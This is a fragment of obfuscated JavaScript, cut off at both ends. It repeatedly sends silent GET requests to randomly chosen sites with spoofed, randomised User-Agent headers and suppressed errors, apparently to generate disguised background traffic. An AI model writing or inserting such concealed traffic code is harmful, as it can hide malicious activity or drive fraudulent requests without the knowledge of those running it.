    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x179d + -0x1636 + 0x492b * 0x1) * getRandomInt(-0xb * -0x11b + 0x75 * 0x39 + -0x2635 * 0x1, 0x5 * -0x1b7 + -0x1230 + 0x359 * 0x8));
}, 0x1a92 + -0x1e * 0xc5 + 0xc6 * -0x4);